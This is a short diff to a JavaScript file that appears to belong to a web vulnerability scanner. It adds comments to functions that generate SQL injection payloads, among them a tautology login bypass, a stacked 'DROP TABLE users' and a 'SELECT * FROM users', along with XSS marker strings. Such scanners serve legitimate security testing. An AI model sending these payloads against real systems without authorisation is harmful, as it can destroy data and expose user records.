@@ -49,23 +49,28 @@ $(document).ready(function() {
     }
   }
 
-  /* Basic SQL */
+  /* SQL debug assitance: attempts to create a table and insert a value for every vulnerable field. */
   var sql_debug = function(name) {
     return "CREATE TABLE sql_vuln IF NOT EXISTS (field VARCHAR); INSERT INTO sql_vuln VALUES('"+name+"');"; 
   }
 
+  /* XSS debug assistance: creates a paragraph with some text that can be searched for by JS to notify
+     of XSS vulnerabilities. */
   var js_debug = function(name) {
     return "<p style='color:red;font-weight:bold;' class='vulnerable_input_found'>"+name+" is vulnerable to XSS attacks.</p>";
   }
 
+  /* Basic SQL */
   attacks[1][0] = function(name) {
     return "' or '1'='1' -- '" + sql_debug(name);
   }
 
+  /* DROP TABLE users attack */
   attacks[1][1] = function(name) {
     return "a';DROP TABLE users;" + sql_debug(name);
   }
 
+  /* Select everything from users attack */
   attacks[1][2] = function(name) {
     return "a’;SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
   }
